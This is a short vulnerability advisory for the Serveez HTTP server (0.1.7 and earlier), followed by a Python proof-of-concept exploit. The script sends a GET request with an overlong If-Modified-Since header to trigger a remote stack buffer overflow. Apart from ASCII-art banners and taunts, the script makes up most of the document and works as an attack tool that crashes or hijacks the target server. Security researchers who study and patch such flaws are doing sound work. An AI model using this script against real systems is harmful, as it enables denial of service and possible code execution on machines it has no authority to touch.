source: http://www.securityfocus.com/bid/42560/info

Serveez is prone to a remote stack-based buffer-overflow vulnerability.

An attacker can exploit this issue to execute arbitrary code within the context of the affected application. Failed exploit attempts will result in a denial-of-service condition.

Serveez 0.1.7 is vulnerable; other versions may also be affected. 

#!/usr/bin/env python
#
#    (,_    ,_,    _,)    SERVEEZ (HTTP SERVER) <= 0.1.7    (,_    ,_,    _,)
#    /|\`-._( )_.-'/|\      REMOTE BUFFER OVERFLOW POC      /|\`-._( )_.-'/|\
#   / | \`'-/ \-'`/ | \   AUTHOR:  LORD VENOM ANTICHRIST   / | \`'-/ \-'`/ | \
#  /  |_.'-.\ /.-'._|  \     <lvaclvaclvac@gmail.com>     /  |_.'-.\ /.-'._|  \
# /_.-'      "      `-._\ GRETZ TO ALL HEAVY METAL MUSIC /_.-'      "      `-._\
#

import sys, socket

try:
  host = sys.argv[1]
  port = int(sys.argv[2]) # OFTEN 42422
  path = sys.argv[3] # MUST EXIST
except:
  print "LAMER"
  exit(1)

soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
  soc.connect((host, port))
  req = "GET " + path + " HTTP/1.0\r\nIf-Modified-Since: " + ("A" * 50) + "\r\n\r\n"
  # WE RULE OVER EIP! (EVIL INCARNATE PENTAGRAM)
  soc.send(req)
  print "DONE"
  satan = 666
except:
  print "CAN'T CONNECT"
  exit(2)

exit(0)

#                ,
#               (@|
#  ,,           ,)|_____________________________________
# //\\8@8@8@8@8@8 / _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ \ OBEY THE MERCYLESS SWORD
# \\//8@8@8@8@8@8 \_____________________________________/  OF SATANIC METAL POWER
#  ``           `)|
#               (@|
#                `

